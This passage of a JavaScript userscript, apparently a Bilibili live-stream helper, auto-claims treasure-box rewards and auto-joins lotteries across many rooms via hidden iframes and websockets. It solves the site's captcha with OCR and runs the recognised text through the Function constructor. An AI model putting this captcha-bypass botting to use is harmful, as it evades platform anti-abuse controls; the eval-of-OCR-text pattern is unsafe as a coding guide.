		TreasureBox.DOM.div_tip.after(TreasureBox.DOM.div_timer);
		treasure_box.after(div);
		if (!Info.mobile_verify) {
		    TreasureBox.setMsg('未绑定<br>手机');
		    window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
		    p.resolve();
		    return true;
		}
		try {
		    if (OCRAD);
		} catch (err) {
		    TreasureBox.setMsg('初始化<br>失败');
		    window.toast('[自动领取瓜子]OCRAD初始化失败，请检查网络', 'error');
		    console.error(`[${NAME}]`, err);
		    p.resolve();
		    return true;
		}
		TreasureBox.timer = setInterval(() => {
		    let t = parseInt(TreasureBox.DOM.div_timer.text(), 10);
		    if (isNaN(t)) t = 0;
		    if (t > 0) TreasureBox.DOM.div_timer.text(`${t - 1}s`);
		    else TreasureBox.DOM.div_timer.hide();
		}, 1e3);
		TreasureBox.DOM.image[0].onload = () => {
		    // 实现功能类似 https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js 中Live.treasure.init()的验证码处理部分
		    const ctx = TreasureBox.DOM.canvas[0].getContext('2d');
		    ctx.font = '40px agencyfbbold';
		    ctx.textBaseline = 'top';
		    ctx.clearRect(0, 0, TreasureBox.DOM.canvas[0].width, TreasureBox.DOM
				  .canvas[0].height);
		    ctx.drawImage(TreasureBox.DOM.image[0], 0, 0);
		    const grayscaleMap = TreasureBox.captcha.OCR.getGrayscaleMap(ctx);
		    const filterMap = TreasureBox.captcha.OCR.orderFilter2In3x3(
			grayscaleMap);
		    ctx.clearRect(0, 0, 120, 40);
		    for (let i = 0; i < filterMap.length; ++i) {
			const gray = filterMap[i];
			ctx.fillStyle = `rgb(${gray}, ${gray}, ${gray})`;
			ctx.fillRect(i % 120, Math.round(i / 120), 1, 1);
		    }
		    try {
			const question = TreasureBox.captcha.correctQuestion(OCRAD(ctx.getImageData(
			    0, 0, 120, 40)));
			DEBUG('TreasureBox.DOM.image.load', 'question =', question);
			const answer = TreasureBox.captcha.eval(question);
			DEBUG('TreasureBox.DOM.image.load', 'answer =', answer);
			if (answer !== undefined) {
			    // window.toast(`[自动领取瓜子]验证码识别结果: ${question} = ${answer}`, 'info');
			    console.info(
				`[${NAME}][自动领取瓜子]验证码识别结果: ${question} = ${answer}`
				    );
				    TreasureBox.promise.calc.resolve(answer);
				}
			    } catch (err) {
				TreasureBox.promise.calc.reject();
			    }
			};
		p.resolve();
		return true;
	    } catch (err) {
		window.toast('[自动领取瓜子]初始化时出现异常，已停止', 'error');
		console.error(`[${NAME}]`, err);
		p.reject();
		return true;
	    }
	});
	return p;
    },
    run: () => {
	try {
	    if (!CONFIG.AUTO_TREASUREBOX || !TreasureBox.timer) return;
	    if (Info.awardBlocked) {
		TreasureBox.setMsg('瓜子小黑屋');
		window.toast('[自动领取瓜子]帐号被关小黑屋，停止领取瓜子', 'caution');
		return;
	    }
	    if (CACHE.treasure_box_ts && !checkNewDay(CACHE.treasure_box_ts)) {
		TreasureBox.setMsg('今日<br>已领完');
		runTomorrow(TreasureBox.run);
		return;
	    }
	    TreasureBox.getCurrentTask().then((response) => {
		DEBUG('TreasureBox.run: TreasureBox.getCurrentTask().then', response);
		if (response.code === 0) {
		    // 获取任务成功
		    TreasureBox.promise.timer = $.Deferred();
		    TreasureBox.promise.timer.then(() => {
			TreasureBox.captcha.calc().then((captcha) => {
			    // 验证码识别完成
			    TreasureBox.getAward(captcha).then(() =>
							       TreasureBox.run(), () => TreasureBox.run()
							      );
			}, () => TreasureBox.run());
		    });
		    TreasureBox.time_end = response.data.time_end;
		    TreasureBox.time_start = response.data.time_start;
		    let t = TreasureBox.time_end - ts_s() + 1;
		    if (t < 0) t = 0;
		    setTimeout(() => {
			if (TreasureBox.promise.timer) TreasureBox.promise.timer.resolve();
		    }, t * 1e3);
		    TreasureBox.DOM.div_timer.text(`${t}s`);
		    TreasureBox.DOM.div_timer.show();
		    TreasureBox.DOM.div_tip.html(
			`次数<br>${response.data.times}/${response.data.max_times}<br>银瓜子<br>${response.data.silver}`
			    );
			} else if (response.code === -10017) {
			    // 今天所有的宝箱已经领完!
			    TreasureBox.setMsg('今日<br>已领完');
			    // window.toast(`[自动领取瓜子]${response.msg}`, 'info');
			    CACHE.treasure_box_ts = ts_ms();
			    Essential.Cache.save();
			    runTomorrow(TreasureBox.run);
			} else if (response.code === -500) {
			    // 请先登录!
			    location.reload();
			} else {
			    window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
			    return TreasureBox.run();
			}
		    });
		} catch (err) {
		    TreasureBox.setMsg('运行<br>异常');
		    window.toast('[自动领取瓜子]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		}
	    },
    setMsg: (htmltext) => {
	if (!CONFIG.AUTO_TREASUREBOX) return;
	if (TreasureBox.promise.timer) {
	    TreasureBox.promise.timer.reject();
	    TreasureBox.promise.timer = undefined;
	}
	if (TreasureBox.DOM.div_timer) TreasureBox.DOM.div_timer.hide();
	if (TreasureBox.DOM.div_tip) TreasureBox.DOM.div_tip.html(htmltext);
    },
    getAward: (captcha, cnt = 0) => {
	if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
	if (cnt > 3) return $.Deferred().resolve(); // 3次时间未到，重新运行任务
	return API.TreasureBox.getAward(TreasureBox.time_start, TreasureBox.time_end, captcha).then(
	    (response) => {
		DEBUG('TreasureBox.getAward: getAward', response);
		switch (response.code) {
		    case 0:
			window.toast(`[自动领取瓜子]领取了 ${response.data.awardSilver} 银瓜子`, 'success');
		    case -903: // -903: 已经领取过这个宝箱
			// window.toast('[自动领取瓜子]已经领取过这个宝箱', 'caution');
			return $.Deferred().resolve();
		    case -902: // -902: 验证码错误
		    case -901: // -901: 验证码过期
			return TreasureBox.captcha.calc().then((captcha) => {
			    return TreasureBox.getAward(captcha, cnt);
			});
		    case -800: // -800：未绑定手机
			TreasureBox.setMsg('未绑定<br>手机');
			window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
			return $.Deferred().reject();
		    case -500: // -500：领取时间未到, 请稍后再试
			{
			    const p = $.Deferred();
			    setTimeout(() => {
				TreasureBox.captcha.calc().then((captcha) => {
				    TreasureBox.getAward(captcha, cnt + 1).then(() =>
										p.resolve(), () => p.reject());
				}, () => p.reject());
			    }, 3e3);
			    return p;
			}
		    case 400: // 400: 访问被拒绝
			if (response.msg.indexOf('拒绝') > -1) {
			    Info.awardBlocked = true;
			    Essential.DataSync.down();
			    TreasureBox.setMsg('拒绝<br>访问');
			    window.toast('[自动领取瓜子]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			    return $.Deferred().reject();
			}
			window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
			return $.Deferred().resolve();
		    default: // 其他错误
			window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
		}
	    }, () => {
		window.toast('[自动领取瓜子]获取任务失败，请检查网络', 'error');
		return delayCall(() => TreasureBox.getAward(captcha, cnt));
	    });
    },
    getCurrentTask: () => {
	if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
	return API.TreasureBox.getCurrentTask().then((response) => {
	    DEBUG('TreasureBox.getCurrentTask: API.TreasureBox.getCurrentTask', response);
	    return $.Deferred().resolve(response);
	}, () => {
	    window.toast('[自动领取瓜子]获取当前任务失败，请检查网络', 'error');
	    return delayCall(() => TreasureBox.getCurrentTask());
	});
    },
    captcha: {
	cnt: 0,
	calc: () => {
	    if (!CONFIG.AUTO_TREASUREBOX) {
		TreasureBox.captcha.cnt = 0;
		return $.Deferred().reject();
	    }
	    if (TreasureBox.captcha.cnt > 100) { // 允许验证码无法识别的次数
		// 验证码识别失败
		TreasureBox.setMsg('验证码<br>识别<br>失败');
		window.toast('[自动领取瓜子]验证码识别失败，已停止', 'error');
		return $.Deferred().reject();
	    }
	    return API.TreasureBox.getCaptcha(ts_ms()).then((response) => {
		DEBUG('TreasureBox.captcha.calc: getCaptcha', response);
		if (response.code === 0) {
		    TreasureBox.captcha.cnt++;
		    const p = $.Deferred();
		    TreasureBox.promise.calc = $.Deferred();
		    TreasureBox.promise.calc.then((captcha) => {
			TreasureBox.captcha.cnt = 0;
			p.resolve(captcha);
		    }, () => {
			TreasureBox.captcha.calc().then((captcha) => {
			    p.resolve(captcha);
			}, () => {
			    p.reject();
			});
		    });
		    TreasureBox.DOM.image.attr('src', response.data.img);
		    return p;
		} else {
		    window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
		    return delayCall(() => TreasureBox.captcha.calc());
		}
	    }, () => {
		window.toast('[自动领取瓜子]加载验证码失败，请检查网络', 'error');
		return delayCall(() => TreasureBox.captcha.calc());
	    });
	},
	// 对B站验证码进行处理
	// 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
	// 删除了未使用的变量
	OCR: {
	    getGrayscaleMap: (context, rate = 235, width = 120, height = 40) => {
		function getGrayscale(x, y) {
		    const pixel = context.getImageData(x, y, 1, 1).data;
		    return pixel ? (77 * pixel[0] + 150 * pixel[1] + 29 * pixel[2] + 128) >> 8 : 0;
		}
		const map = [];
		for (let y = 0; y < height; y++) { // line y
		    for (let x = 0; x < width; x++) { // column x
			const gray = getGrayscale(x, y);
			map.push(gray > rate ? gray : 0);
		    }
		}
		return map;
	    },
	    orderFilter2In3x3: (grayscaleMap, n = 9, width = 120) => {
		const gray = (x, y) => (x + y * width >= 0) ? grayscaleMap[x + y * width] : 255;
		const map = [];
		const length = grayscaleMap.length;
		const catchNumber = n - 1;
		for (let i = 0; i < length; ++i) {
		    const [x, y] = [i % width, Math.floor(i / width)];
		    const matrix = new Array(9);
		    matrix[0] = gray(x - 1, y - 1);
		    matrix[1] = gray(x + 0, y - 1);
		    matrix[2] = gray(x + 1, y - 1);
		    matrix[3] = gray(x - 1, y + 0);
		    matrix[4] = gray(x + 0, y + 0);
		    matrix[5] = gray(x + 1, y + 0);
		    matrix[6] = gray(x - 1, y + 1);
		    matrix[7] = gray(x + 0, y + 1);
		    matrix[8] = gray(x + 1, y + 1);
		    matrix.sort((a, b) => a - b);
		    map.push(matrix[catchNumber]);
		}
		return map;
	    },
	    execMap: (connectMap, rate = 4) => {
		const map = [];
		const connectMapLength = connectMap.length;
		for (let i = 0; i < connectMapLength; ++i) {
		    let blackPoint = 0;
		    // const [x, y] = [i % 120, Math.round(i / 120)];
		    const top = connectMap[i - 120];
		    const topLeft = connectMap[i - 120 - 1];
		    const topRight = connectMap[i - 120 + 1];
		    const left = connectMap[i - 1];
		    const right = connectMap[i + 1];
		    const bottom = connectMap[i + 120];
		    const bottomLeft = connectMap[i + 120 - 1];
		    const bottomRight = connectMap[i + 120 + 1];
		    if (top) blackPoint += 1;
		    if (topLeft) blackPoint += 1;
		    if (topRight) blackPoint += 1;
		    if (left) blackPoint += 1;
		    if (right) blackPoint += 1;
		    if (bottom) blackPoint += 1;
		    if (bottomLeft) blackPoint += 1;
		    if (bottomRight) blackPoint += 1;
		    if (blackPoint > rate) map.push(1);
		    else map.push(0);
		}
		return map;
	    }
	},
	eval: (fn) => {
	    let Fn = Function;
	    return new Fn(`return ${fn}`)();
	},
	// 修正OCRAD识别结果
	// 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
	// 修改部分：
	// 1.将correctStr声明在correctQuestion函数内部，并修改相关引用
	// 2.在correctStr中增加'>': 3
	correctStr: {
	    'g': 9,
	    'z': 2,
	    'Z': 2,
	    'o': 0,
	    'l': 1,
	    'B': 8,
	    'O': 0,
	    'S': 6,
	    's': 6,
	    'i': 1,
	    'I': 1,
	    '.': '-',
	    '_': 4,
	    'b': 6,
	    'R': 8,
	    '|': 1,
	    'D': 0,
	    '>': 3
	},
	correctQuestion: (question) => {
	    let q = '';
	    question = question.trim();
	    for (let i in question) {
		let a = TreasureBox.captcha.correctStr[question[i]];
		q += (a !== undefined ? a : question[i]);
	    }
	    if (q[2] === '4') q[2] = '+';
	    return q;
	}
    }
}; // Constantly Run, Need Init

	const Lottery = {
	    hasWS: false,
	    createCount: 0,
	    roomidSet: new Set(),
	    listenSet: new Set(),
	    Gift: {
		_join: (roomid, raffleId, type, time_wait = 0) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    raffleId = parseInt(raffleId, 10);
		    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
		    return delayCall(() => API.Lottery.Gift.join(roomid, raffleId, type).then((response) => {
			DEBUG('Lottery.Gift._join: API.Lottery.Gift.join', response);
			switch (response.code) {
			    case 0:
				window.toast(
				    `[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type})`,
				    'success');
				break;
			    case 402:
				// 抽奖已过期，下次再来吧
				break;
			    case 65531:
				// 65531: 非当前直播间或短ID直播间试图参加抽奖
				//Info.blocked = true;
				Essential.DataSync.down();
				window.toast(
				    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`,
				    'error');
				break;
			    default:
				if (response.msg.indexOf('拒绝') > -1) {
				    //Info.blocked = true;
				    //Essential.DataSync.down();
				    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
				} else if (response.msg.indexOf('快') > -1) {
				    return delayCall(() => Lottery.Gift._join(roomid, raffleId));
				} else {
				    window.toast(
					`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`,
					'caution');
				}
			}
		    }, () => {
			window.toast(
			    `[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`,
			    'error');
			return delayCall(() => Lottery.Gift._join(roomid, raffleId));
		    }), time_wait * 1e3 + 5e3);
		}
	    },
	    Guard: {
		wsList: [],
		_join: (roomid, id) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    return API.Lottery.Guard.join(roomid, id).then((response) => {
			DEBUG('Lottery.Guard._join: API.Lottery.Guard.join', response);
			if (response.code === 0) {
			    window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功`, 'success');
			} else if (response.msg.indexOf('拒绝') > -1) {
			    //Info.blocked = true;
			    //Essential.DataSync.down();
			    //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			} else if (response.msg.indexOf('快') > -1) {
			    return delayCall(() => Lottery.Guard._join(roomid, id));
			} else if (response.msg.indexOf('过期') > -1) {} else {
			    window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`,
					 'caution');
			}
		    }, () => {
			window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
			return delayCall(() => Lottery.Guard._join(roomid, id));
		    });
		}
	    },
	    MaterialObject: {
		list: [],
		ignore_keyword: ['test', 'encrypt', '测试', '钓鱼', '加密', '炸鱼'],
		run: () => {
		    try {
			if (CACHE.materialobject_ts) {
			    const diff = ts_ms() - CACHE.materialobject_ts;
			    const interval = CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL *
				  60e3 || 600e3;
			    if (diff < interval) {
				setTimeout(Lottery.MaterialObject.run, interval - diff);
				return $.Deferred().resolve();
			    }
			}
			return Lottery.MaterialObject.check().then((aid) => {
			    if (aid) { // aid有效
				CACHE.last_aid = aid;
				CACHE.materialobject_ts = ts_ms();
				Essential.Cache.save();
			    }
			    setTimeout(Lottery.MaterialObject.run, CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG
				       .CHECK_INTERVAL * 60e3 || 600e3);
			}, () => delayCall(() => Lottery.MaterialObject.run()));
		    } catch (err) {
			window.toast('[自动抽奖][实物抽奖]运行时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		},
		check: (aid, valid = 564, rem = 9) => { // TODO
		    aid = parseInt(aid || (CACHE.last_aid), 10);
		    if (isNaN(aid)) aid = valid;
		    DEBUG('Lottery.MaterialObject.check: aid=', aid);
		    return API.Lottery.MaterialObject.getStatus(aid).then((response) => {
			DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.getStatus',
			      response);
			if (response.code === 0 && response.data) {
			    if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.IGNORE_QUESTIONABLE_LOTTERY &&
				Lottery.MaterialObject.ignore_keyword.some(v => response.data.title
									   .toLowerCase().indexOf(v) > -1)) {
				window.toast(`[自动抽奖][实物抽奖]忽略抽奖(aid=${aid})`, 'info');
				return Lottery.MaterialObject.check(aid + 1, aid);
			    } else {
				return Lottery.MaterialObject.join(aid, response.data.title,
								   response.data.typeB).then(() => Lottery.MaterialObject.check(
				    aid + 1, aid));
			    }
			} else if (response.code === -400 || response.data == null) { // 活动不存在
			    if (rem) return Lottery.MaterialObject.check(aid + 1, valid, rem - 1);
			    return $.Deferred().resolve(valid);
			} else {
			    window.toast(`[自动抽奖][实物抽奖]${response.msg}`, 'info');
			}
		    }, () => {
			window.toast(`[自动抽奖][实物抽奖]检查抽奖(aid=${aid})失败，请检查网络`, 'error');
			return delayCall(() => Lottery.MaterialObject.check(aid, valid));
		    });
		},
		join: (aid, title, typeB, i = 0) => {
		    if (i >= typeB.length) return $.Deferred().resolve();
		    if (Lottery.MaterialObject.list.some(v => v.aid === aid && v.number === i + 1)) return Lottery
			.MaterialObject.join(aid, title, typeB, i + 1);
		    const number = i + 1;
		    const obj = {
			title: title,
			aid: aid,
			number: number,
			status: typeB[i].status,
			join_start_time: typeB[i].join_start_time,
			join_end_time: typeB[i].join_end_time
		    };
		    switch (obj.status) {
			case -1: // 未开始
			    {
				Lottery.MaterialObject.list.push(obj);
				const p = $.Deferred();
				p.then(() => {
				    return Lottery.MaterialObject.draw(obj);
				});
				setTimeout(() => {
				    p.resolve();
				}, (obj.join_start_time - ts_s() + 1) * 1e3);
			    }
			    break;
			case 0: // 可参加
			    return Lottery.MaterialObject.draw(obj).then(() => {
				return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
			    });
			case 1: // 已参加
			    {
				Lottery.MaterialObject.list.push(obj);
				const p = $.Deferred();
				p.then(() => {
				    return Lottery.MaterialObject.notice(obj);
				});
				setTimeout(() => {
				    p.resolve();
				}, (obj.join_end_time - ts_s() + 1) * 1e3);
			    }
			    break;
		    }
		    return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
		},
		draw: (obj) => {
		    return API.Lottery.MaterialObject.draw(obj.aid, obj.number).then((response) => {
			DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.draw',
			      response);
			if (response.code === 0) {
			    $.each(Lottery.MaterialObject.list, (i, v) => {
				if (v.aid === obj.aid && v.number === obj.number) {
				    v.status = 1;
				    Lottery.MaterialObject.list[i] = v;
				    return false;
				}
			    });
			    const p = $.Deferred();
			    p.then(() => {
				return Lottery.MaterialObject.notice(obj);
			    });
			    setTimeout(() => {
				p.resolve();
			    }, (obj.join_end_time - ts_s() + 1) * 1e3);
			} else {
			    window.toast(
				`[自动抽奖][实物抽奖]"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`,
				'caution');
			}
		    }, () => {
			window.toast(
			    `[自动抽奖][实物抽奖]参加"${obj.title}"(aid=${obj.aid},number=${obj.number})失败，请检查网络`,
			    'error');
			return delayCall(() => Lottery.MaterialObject.draw(obj));
		    });
		},
		notice: (obj) => {
		    return API.Lottery.MaterialObject.getWinnerGroupInfo(obj.aid, obj.number).then((
			response) => {
			DEBUG(
			    'Lottery.MaterialObject.check: API.Lottery.MaterialObject.getWinnerGroupInfo',
			    response);
			if (response.code === 0) {
			    $.each(Lottery.MaterialObject.list, (i, v) => {
				if (v.aid === obj.aid && v.number === obj.number) {
				    v.status = 3;
				    Lottery.MaterialObject.list[i] = v;
				    return false;
				}
			    });
			    $.each(response.data.winnerList, (i, v) => {
				if (v.uid === Info.uid) {
				    window.toast(
					`[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})获得奖励"${v.giftTitle}"`,
					'info');
				    return false;
				}
			    });
			} else {
			    window.toast(
				`[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`,
				'caution');
			}
		    }, () => {
			window.toast(
			    `[自动抽奖][实物抽奖]获取抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})中奖名单失败，请检查网络`,
			    'error');
			return delayCall(() => Lottery.MaterialObject.notice(obj));
		    });
		}
	    },
	    create: (roomid, real_roomid, type, link_url) => {
		if (Lottery.createCount > 99) location.reload();
		if (!real_roomid) real_roomid = roomid;
		if (Info.roomid === real_roomid) return;
		// roomid过滤，防止创建多个同样roomid的iframe
		if (Lottery.roomidSet.has(real_roomid)) return;
		Lottery.roomidSet.add(real_roomid);
		const iframe = $('<iframe style="display: none;"></iframe>')[0];
		iframe.name = real_roomid;
		let url;
		if (link_url) url = `${link_url.replace('https:', '').replace('http:', '')}` + (Info.visit_id ?
												`&visit_id=${Info.visit_id}` : '');
		else url = `//live.bilibili.com/${roomid}` + (Info.visit_id ? `?visit_id=${Info.visit_id}` :
							      '');
		iframe.src = url;
		document.body.appendChild(iframe);
		const pFinish = $.Deferred();
		pFinish.then(() => {
		    window[NAME].iframeSet.delete(iframe);
		    $(iframe).remove();
		    Lottery.roomidSet.delete(real_roomid);
		});
		const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
		const pInit = $.Deferred();
		pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
		const up = () => {
		    CACHE = window[NAME].CACHE;
		    Info = window[NAME].Info;
		    Essential.Cache.save();
		    const pUp = $.Deferred();
		    pUp.then(up);
		    iframe[NAME].promise.up = pUp;
		};
		const pUp = $.Deferred();
		pUp.then(up);
		iframe[NAME] = {
		    roomid: real_roomid,
		    type: type,
		    promise: {
			init: pInit, // 这个Promise在子脚本加载完成时resolve
			finish: pFinish, // 这个Promise在iframe需要删除时resolve
			down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
			up: pUp
		    }
		};
		window[NAME].iframeSet.add(iframe);
		++Lottery.createCount;
		DEBUG('Lottery.create: iframe', iframe);
	    },
	    listen: (uid, roomid, area = '', gift = false, volatile = true) => {
		if (Lottery.listenSet.has(roomid)) return;
		Lottery.listenSet.add(roomid);
		return API.room.getConf(roomid).then((response) => {
		    DEBUG('Lottery.listen: API.room.getConf', response);
		    //if (Info.blocked) return;
		    let ws = new API.DanmuWebSocket(uid, roomid, response.data.host_server_list,
						    response.data.token);
		    let id = 0;
		    if (volatile) id = Lottery.Guard.wsList.push(ws);
		    ws.bind((newws) => {
			if (volatile && id) Lottery.Guard.wsList[id - 1] = newws;
			window.toast(`[自动抽奖]${area}(${roomid})弹幕服务器连接断开，尝试重连`, 'caution');
		    }, () => {
			window.toast(`[自动抽奖]${area}(${roomid})连接弹幕服务器成功`, 'success');
			//if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY || CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) Lottery.create(roomid, roomid, 'LOTTERY');
		    }, (num) => {
			//console.log(`房间${roomid}，人气值：${num}`);
			//if (Info.blocked) {
			//    ws.close();
			//    window.toast(`[自动抽奖]${area}(${roomid})主动与弹幕服务器断开连接`, 'info');
			//}
		    }, (obj, str) => {
			switch (obj.cmd) {
			    case 'DANMU_MSG':
			    case 'SEND_GIFT':
			    case 'ENTRY_EFFECT':
			    case 'WELCOME':
			    case 'WELCOME_GUARD':
			    case 'COMBO_SEND':
			    case 'COMBO_END':
			    case 'WISH_BOTTLE':
			    case 'ROOM_RANK':
			    case 'ROOM_REAL_TIME_MESSAGE_UPDATE':
				break;
			    case 'NOTICE_MSG':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				switch (obj.msg_type) {
				    case 1:
					// 系统
					break;
				    case 2:
				    case 8:
					// 礼物抽奖
					if (!CONFIG.AUTO_LOTTERY) break;
					if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
					//if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
					BiliPushUtils.Gift.run(obj.real_roomid);
					break;
				    case 3:
					// 舰队领奖
					if (!CONFIG.AUTO_LOTTERY) break;
					if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
					//if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
					BiliPushUtils.Guard.run(obj.real_roomid);
					break;
				    case 4:
					// 登船
					break;
				    case 5:
					// 获奖
					break;
				    case 6:
					// 节奏风暴
					if (!CONFIG.AUTO_LOTTERY) break;
					//if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
					BiliPushUtils.Storm.run(roomid);
					break;
				}
				break;
			    case 'GUARD_LOTTERY_START':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				if (!CONFIG.AUTO_LOTTERY) break;
				if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
				//if (Info.blocked || !obj.data.roomid || !obj.data.lottery.id) break;
				if (obj.data.roomid === Info.roomid) {
				    Lottery.Guard._join(Info.roomid, obj.data.lottery.id);
				} else {
				    BiliPushUtils.Guard.run(obj.data.roomid);
				}
				break;
			    case 'RAFFLE_START':
			    case 'TV_START':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				if (!CONFIG.AUTO_LOTTERY) break;
				if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
				//if (Info.blocked || !obj.data.msg.roomid || !obj.data.msg.real_roomid || !obj.data.raffleId) break;
				if (obj.data.msg.real_roomid === Info.roomid) {
				    Lottery.Gift._join(Info.roomid, obj.data.raffleId, obj.data
						       .type, obj.data.time_wait);
				} else {
				    BiliPushUtils.Gift.run(obj.data.msg.real_roomid);
				}
				break;
			    case 'SPECIAL_GIFT':
				DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				if (!CONFIG.AUTO_LOTTERY) break;
				if (obj.data['39']) {
				    switch (obj.data['39'].action) {
					case 'start':
					    // 节奏风暴开始
					    BiliPushUtils.Storm.run(roomid);
					case 'end':
					    // 节奏风暴结束
				    }
				};
				break;
			    default:
				if (gift) DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
				break;
			}
		    });
		}, () => delayCall(() => Lottery.listen(uid, roomid, area, volatile)));
	    },
	    listenAll: () => {
		//if (Info.blocked) return;
		if (!Lottery.hasWS) {
		    Lottery.listen(Info.uid, Info.roomid, '', true, false);
		    Lottery.hasWS = true;
		}
		Lottery.Guard.wsList.forEach(v => v.close());
		Lottery.Guard.wsList = [];
		Lottery.listenSet = new Set();
		Lottery.listenSet.add(Info.roomid);
		const fn1 = () => {
		    return API.room.getList().then((response) => {
			DEBUG('Lottery.listenAll: API.room.getList', response);
			for (const obj of response.data) {
			    fn2(obj);
			}
		    }, () => delayCall(() => fn1()));
		};
		const fn2 = (obj) => {
		    return API.room.getRoomList(obj.id, 0, 0, 1, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD ?
						CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER : 1).then((
			response) => {
			DEBUG('Lottery.listenAll: API.room.getRoomList', response);
			for (let j = 0; j < response.data.length; ++j) {
			    Lottery.listen(Info.uid, response.data[j].roomid, `[${obj.name}区]`,
					   !j, true);
			}
		    }, () => delayCall(() => fn2(obj)));
		};
		fn1();
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_LOTTERY) return;
		    if (Info.blocked) {
			//window.toast('[自动抽奖]帐号被关小黑屋，停止自动抽奖', 'caution');
			//return;
		    }
		    if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY) Lottery.MaterialObject.run();
		    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
			window.toast('[自动抽奖]不需要连接弹幕服务器', 'info');
			return;
		    }
		    if (CONFIG.AUTO_LOTTERY_CONFIG.HIDE_POPUP) {
			addCSS('#chat-popup-area-vm {display: none;}');
		    }
		    Lottery.listenAll();
		    if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL > 0) {
			setInterval(() => {
			    Lottery.listenAll();
			}, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL *
				    60e3);
		    }
		    setInterval(() => {
			if (Lottery.createCount > 0) --Lottery.createCount;
		    }, 10e3);
		    if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL > 0) {
			setTimeout(() => {
			    // if(!BiliPush.connected){
			    //     location.reload();
			    // }
			}, CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL * 60e3);
		    }
		} catch (err) {
		    window.toast('[自动抽奖]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		}
	    }
	}; // Constantly Run

	const createIframe = (url, type, name) => {
	    const iframe = $(`<iframe style="display: none;"></iframe>`)[0];
	    if (!name) name =
		`_${Math.floor(Math.random() * 10000 + Math.random() * 1000 + Math.random() * 100 + Math.random() * 10).toString(16)}`;
	    iframe.name = name;
	    iframe.src = `${url}/${iframe.name}`;
